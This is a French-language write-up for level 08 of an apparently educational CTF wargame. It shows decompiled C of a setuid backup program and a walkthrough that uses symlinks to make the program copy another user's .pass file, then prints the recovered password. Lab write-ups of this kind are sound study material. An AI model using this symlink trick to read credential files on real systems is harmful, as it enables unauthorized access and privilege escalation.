# **Level 08**

Code decompiler,
```
void log_wrapper(FILE *param_1,char *param_2,char *param_3)

{
  char cVar1;
  size_t sVar2;
  ulong uVar3;
  ulong uVar4;
  char *pcVar5;
  long in_FS_OFFSET;
  byte bVar6;
  undefined8 local_120;
  char local_118 [264];
  long local_10;
  
  bVar6 = 0;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_120 = param_1;
  strcpy(local_118,param_2);
  uVar3 = 0xffffffffffffffff;
  pcVar5 = local_118;
  do {
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    cVar1 = *pcVar5;
    pcVar5 = pcVar5 + (ulong)bVar6 * -2 + 1;
  } while (cVar1 != '\0');
  uVar4 = 0xffffffffffffffff;
  pcVar5 = local_118;
  do {
    if (uVar4 == 0) break;
    uVar4 = uVar4 - 1;
    cVar1 = *pcVar5;
    pcVar5 = pcVar5 + (ulong)bVar6 * -2 + 1;
  } while (cVar1 != '\0');
  snprintf(local_118 + (~uVar4 - 1),0xfe - (~uVar3 - 1),param_3);
  sVar2 = strcspn(local_118,"\n");
  local_118[sVar2] = '\0';
  fprintf(local_120,"LOG: %s\n",local_118);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return;
}



undefined8 main(int param_1,undefined8 *param_2)

{
  char cVar1;
  int __fd;
  int iVar2;
  FILE *pFVar3;
  FILE *__stream;
  ulong uVar4;
  undefined8 *puVar5;
  long in_FS_OFFSET;
  byte bVar6;
  char local_79;
  undefined8 local_78;
  undefined2 local_70;
  char local_6e;
  long local_10;
  
  bVar6 = 0;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_79 = -1;
  if (param_1 != 2) {
    printf("Usage: %s filename\n",*param_2);
  }
  pFVar3 = fopen("./backups/.log","w");
  if (pFVar3 == (FILE *)0x0) {
    printf("ERROR: Failed to open %s\n","./backups/.log");
                    // WARNING: Subroutine does not return
    exit(1);
  }
  log_wrapper(pFVar3,"Starting back up: ",param_2[1]);
  __stream = fopen((char *)param_2[1],"r");
  if (__stream == (FILE *)0x0) {
    printf("ERROR: Failed to open %s\n",param_2[1]);
                    // WARNING: Subroutine does not return
    exit(1);
  }
  local_78._0_1_ = '.';
  local_78._1_1_ = '/';
  local_78._2_1_ = 'b';
  local_78._3_1_ = 'a';
  local_78._4_1_ = 'c';
  local_78._5_1_ = 'k';
  local_78._6_1_ = 'u';
  local_78._7_1_ = 'p';
  local_70._0_1_ = 's';
  local_70._1_1_ = '/';
  local_6e = '\0';
  uVar4 = 0xffffffffffffffff;
  puVar5 = &local_78;
  do {
    if (uVar4 == 0) break;
    uVar4 = uVar4 - 1;
    cVar1 = *(char *)puVar5;
    puVar5 = (undefined8 *)((long)puVar5 + (ulong)bVar6 * -2 + 1);
  } while (cVar1 != '\0');
  strncat((char *)&local_78,(char *)param_2[1],99 - (~uVar4 - 1));
  __fd = open((char *)&local_78,0xc1,0x1b0);
  if (__fd < 0) {
    printf("ERROR: Failed to open %s%s\n","./backups/",param_2[1]);
                    // WARNING: Subroutine does not return
    exit(1);
  }
  while( true ) {
    iVar2 = fgetc(__stream);
    local_79 = (char)iVar2;
    if (local_79 == -1) break;
    write(__fd,&local_79,1);
  }
  log_wrapper(pFVar3,"Finished back up ",param_2[1]);
  fclose(__stream);
  close(__fd);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return 0;
}
```
En regardant dans le `dossier courant` du level08, on voit en plus de l'executable, un `dossier backups` avec un fichier .log.
en executant le code, on voit qu'il attend un fichier en argument,
```
level08@OverRide:~$ ./level08 
Usage: ./level08 filename
ERROR: Failed to open (null)
```
Si on essaye de lui passer le fichier .log en argument,
```
level08@OverRide:~$ ./level08 backups/.log 
ERROR: Failed to open ./backups/backups/.log
level08@OverRide:~$ cat backups/.log
LOG: Starting back up: backups/.log
```
On voit qu'il ecrit quand meme dedant, essayons avec un autre fichier.
```
level08@OverRide:~$ ./level08 /var/crash/test
ERROR: Failed to open ./backups//var/crash/test
level08@OverRide:~$ cat backups/.log
LOG: Starting back up: /var/crash/test
```
Encore une fois, l'erreur se retrouve dans le fichier .log.
En lisant le code on voit que le `premier fopen` se fait sur le fichier `.log` et ensuite sur l'`argument` passe en parametre,
Or avec les precedent test, on en conclu que le programme accepte seulement les fichier de son repertoire courant et qu'il n'aime pas les path absolu.
```
level08@OverRide:~$ cd /var/crash
level08@OverRide:/var/crash$ touch test
level08@OverRide:/var/crash$ /home/users/level08/./level08 test 
ERROR: Failed to open ./backups/.log
```
Ici on voit qu'il ne trouve pas le fichier .log.
Essayons donc depuis /var/crash d'ouvrir le fichier .log avec le programme.
Utilisons un `lien symbolique` vers le `dossier backups` et relancons le programme avec test,
```
level08@OverRide:/var/crash$ ln -s /home/users/level08/backups backups
level08@OverRide:/var/crash$ ll
total 0
drwxrwsrwt 1 root    whoopsie  80 Feb 16 13:53 ./
drwxr-xr-x 1 root    root     120 Oct  2  2016 ../
lrwxrwxrwx 1 level08 whoopsie  27 Feb 16 13:53 backups -> /home/users/level08/backups/
-rw-rw-r-- 1 level08 whoopsie   0 Feb 16 13:48 test
```
Execution,
```
level08@OverRide:/var/crash$ /home/users/level08/./level08 test 
level08@OverRide:/var/crash$ ll /home/users/level08/backups/
total 4
drwxrwx---+ 1 level09 users    80 Feb 16 13:53 ./
dr-xr-x---+ 1 level08 level08 100 Oct 19  2016 ../
-rwxrwx---+ 1 level09 users    55 Feb 16 13:53 .log*
-r--r-----+ 1 level09 users     0 Feb 16 13:53 test

```
Ok, maintenant on sait comment ecrire dans le dossier backups,
Essayons donc maintenant de passer un fichier plus sensible en parametre, comme le password de level09,
toujours en passant par un `symlink`.
```
level08@OverRide:/var/crash$ ln -s /home/users/level09/.pass pass
level08@OverRide:/var/crash$ ll
total 0
drwxrwsrwt 1 root    whoopsie 100 Feb 16 13:56 ./
drwxr-xr-x 1 root    root     120 Oct  2  2016 ../
lrwxrwxrwx 1 level08 whoopsie  27 Feb 16 13:53 backups -> /home/users/level08/backups/
lrwxrwxrwx 1 level08 whoopsie  25 Feb 16 13:56 pass -> /home/users/level09/.pass
-rw-rw-r-- 1 level08 whoopsie   0 Feb 16 13:48 test
```
Ensuite, executons le programme avec le fichier pass.
```
level08@OverRide:/var/crash$ /home/users/level08/./level08 pass
level08@OverRide:/var/crash$ cat backups/pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
Essayons le password,
```
level08@OverRide:/var/crash$ su level09
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
```
> ### NEXT : [Level 09](/level09/resources/README.md)
